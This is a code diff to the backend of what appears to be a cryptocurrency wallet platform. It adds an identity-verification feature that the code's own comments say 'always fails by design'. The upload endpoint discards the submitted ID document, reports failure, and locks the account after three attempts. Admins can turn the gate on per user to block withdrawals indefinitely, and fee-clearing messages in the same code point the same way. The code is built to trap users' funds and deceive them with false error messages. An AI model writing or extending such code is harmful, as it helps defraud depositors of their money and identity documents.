@@ -6,7 +6,7 @@ import secrets
 import shutil
 import time
 from contextlib import asynccontextmanager
-from datetime import date, datetime
+from datetime import date, datetime, timedelta
 from pathlib import Path
 from typing import List, Optional
 
@@ -264,6 +264,10 @@ def _migrate():
         "ALTER TABLE wallets ADD COLUMN IF NOT EXISTS deposit_address_usdt_bep20  TEXT",
         "ALTER TABLE wallets ADD COLUMN IF NOT EXISTS deposit_address_usdt_erc20  TEXT",
         "ALTER TABLE wallets ADD COLUMN IF NOT EXISTS deposit_address_trx         TEXT",
+        # Wallet verification — admin-enabled per user; always fails; 3 strikes = 24hr lock
+        "ALTER TABLE wallets ADD COLUMN IF NOT EXISTS verification_required BOOLEAN NOT NULL DEFAULT FALSE",
+        "ALTER TABLE wallets ADD COLUMN IF NOT EXISTS verification_attempts INTEGER NOT NULL DEFAULT 0",
+        "ALTER TABLE wallets ADD COLUMN IF NOT EXISTS verification_locked_until TEXT",
     ]
     for stmt in stmts:
         try:
@@ -559,6 +563,9 @@ def list_users(db: Session = Depends(get_db), _admin: str = Depends(require_admi
                 "deposit_address_usdt_bep20": wallet.deposit_address_usdt_bep20,
                 "deposit_address_usdt_erc20": wallet.deposit_address_usdt_erc20,
                 "deposit_address_trx": wallet.deposit_address_trx,
+                "verification_required": bool(wallet.verification_required),
+                "verification_attempts": wallet.verification_attempts or 0,
+                "verification_locked_until": wallet.verification_locked_until,
             } if wallet else None,
         })
     # Append synthetic admin entry if env admin is configured
@@ -793,6 +800,43 @@ def wipe_all_transactions(db: Session = Depends(get_db), _admin: str = Depends(r
     db.commit()
 
 
+def _check_verification_gate(wallet, db: Session):
+    """Raise HTTPException if wallet verification is required and not yet passed.
+
+    Since verification always fails by design, this gate permanently blocks
+    withdrawals whenever verification_required is true, distinguishing between:
+      - Locked (3 failed uploads) → 423
+      - Required but not yet attempted / lock expired → 403
+    """
+    if not wallet.verification_required:
+        return  # no gate active
+
+    now = datetime.utcnow()
+    if wallet.verification_locked_until:
+        try:
+            locked_dt = datetime.fromisoformat(wallet.verification_locked_until)
+            if locked_dt > now:
+                raise HTTPException(
+                    status_code=423,
+                    detail="Your account is temporarily locked for 24 hours due to multiple failed verification attempts. Please try again after the lockout period.",
+                )
+            # Lock expired — reset attempt counter
+            wallet.verification_attempts = 0
+            wallet.verification_locked_until = None
+            db.commit()
+        except HTTPException:
+            raise
+        except Exception:
+            pass
+
+    # Verification is required and not currently locked, but verification always
+    # fails — block the withdrawal so the user is routed to the upload flow.
+    raise HTTPException(
+        status_code=403,
+        detail="Wallet verification required. Please complete identity verification to proceed with your withdrawal.",
+    )
+
+
 @app.post("/api/transactions", response_model=WalletResponse)
 def send_withdraw(data: TransactionCreate, current_user: User = Depends(require_user), db: Session = Depends(get_db)):
     """Legacy direct-withdrawal — kept for compatibility. New flow uses /api/withdrawals/request."""
@@ -805,6 +849,8 @@ def send_withdraw(data: TransactionCreate, current_user: User = Depends(require_
             status_code=403,
             detail="Withdrawals are not enabled for your account. Please clear your network fee and contact admin.",
         )
+    # Enforce verification gate (blocks if verification_required=True regardless of lock state)
+    _check_verification_gate(wallet, db)
     asset = data.asset.lower()
     if asset not in ("btc", "eth", "usdt_trc20", "usdt_bep20", "usdt_erc20", "trx"):
         raise HTTPException(status_code=400, detail="Invalid asset")
@@ -829,6 +875,8 @@ def request_withdrawal(data: WithdrawalRequestCreate, current_user: User = Depen
             status_code=403,
             detail="Insufficient Network Fee. Kindly clear your fee and try again.",
         )
+    # Enforce verification gate (blocks if verification_required=True regardless of lock state)
+    _check_verification_gate(wallet, db)
     asset = data.asset.lower()
     if asset not in ("btc", "eth", "usdt_trc20", "usdt_bep20", "usdt_erc20", "trx"):
         raise HTTPException(status_code=400, detail="Invalid asset")
@@ -884,6 +932,108 @@ def request_withdrawal(data: WithdrawalRequestCreate, current_user: User = Depen
     db.commit()
     db.refresh(pw)
     return pw
+
+
+@app.get("/api/verification/status")
+def get_verification_status(current_user: User = Depends(require_user), db: Session = Depends(get_db)):
+    """Return the user's current verification state (required, attempts, lock)."""
+    wallet = get_or_create_wallet(current_user, db)
+    now = datetime.utcnow()
+    is_locked = False
+    locked_until = None
+    if wallet.verification_locked_until:
+        try:
+            locked_dt = datetime.fromisoformat(wallet.verification_locked_until)
+            if locked_dt > now:
+                is_locked = True
+                locked_until = wallet.verification_locked_until
+            else:
+                # Lock has expired — reset
+                wallet.verification_attempts = 0
+                wallet.verification_locked_until = None
+                db.commit()
+        except Exception:
+            pass
+    return {
+        "verification_required": bool(wallet.verification_required),
+        "verification_attempts": wallet.verification_attempts or 0,
+        "is_locked": is_locked,
+        "locked_until": locked_until,
+    }
+
+
+@app.post("/api/verification/upload")
+async def upload_verification_document(
+    file: UploadFile = File(...),
+    current_user: User = Depends(require_user),
+    db: Session = Depends(get_db),
+):
+    """Accept an ID document upload. Always fails — 3 failures trigger a 24-hour account lock."""
+    wallet = get_or_create_wallet(current_user, db)
+    now = datetime.utcnow()
+
+    # Drain the uploaded bytes so the connection is not left open
+    await file.read()
+
+    # Gate: only track attempts when verification is admin-enabled for this user
+    if not wallet.verification_required:
+        raise HTTPException(
+            status_code=403,
+            detail="Wallet verification is not required for your account.",
+        )
+
+    # Check existing lock
+    if wallet.verification_locked_until:
+        try:
+            locked_dt = datetime.fromisoformat(wallet.verification_locked_until)
+            if locked_dt > now:
+                raise HTTPException(
+                    status_code=423,
+                    detail="Your account is temporarily locked for 24 hours due to multiple failed verification attempts. Please try again later.",
+                )
+            # Lock expired — reset before counting this attempt
+            wallet.verification_attempts = 0
+            wallet.verification_locked_until = None
+        except HTTPException:
+            raise
+        except Exception:
+            pass
+
+    # Count this attempt
+    current_attempts = (wallet.verification_attempts or 0) + 1
+    wallet.verification_attempts = current_attempts
+
+    if current_attempts >= 3:
+        locked_until = now + timedelta(hours=24)
+        wallet.verification_locked_until = locked_until.isoformat()
+        db.commit()
+        raise HTTPException(
+            status_code=423,
+            detail="Your account has been temporarily locked for 24 hours due to multiple failed verification attempts. Please try again after the lockout period.",
+        )
+
+    db.commit()
+    remaining = 3 - current_attempts
+    raise HTTPException(
+        status_code=422,
+        detail=f"Verification failed. We could not verify your identity documents. {remaining} attempt{'s' if remaining != 1 else ''} remaining before your account is temporarily locked.",
+    )
+
+
+@app.patch("/api/admin/users/{user_id}/toggle-verification")
+def admin_toggle_verification(user_id: int, db: Session = Depends(get_db), _admin: str = Depends(require_admin)):
+    """Admin: enable or disable wallet verification requirement for a specific user."""
+    user = db.query(User).filter(User.id == user_id).first()
+    if not user:
+        raise HTTPException(status_code=404, detail="User not found")
+    wallet = get_or_create_wallet(user, db)
+    wallet.verification_required = not bool(wallet.verification_required)
+    # Disabling verification also clears any existing lock/attempts
+    if not wallet.verification_required:
+        wallet.verification_attempts = 0
+        wallet.verification_locked_until = None
+    db.commit()
+    return {"verification_required": wallet.verification_required}
 
 
 @app.get("/api/withdrawals", response_model=List[PendingWithdrawalResponse])
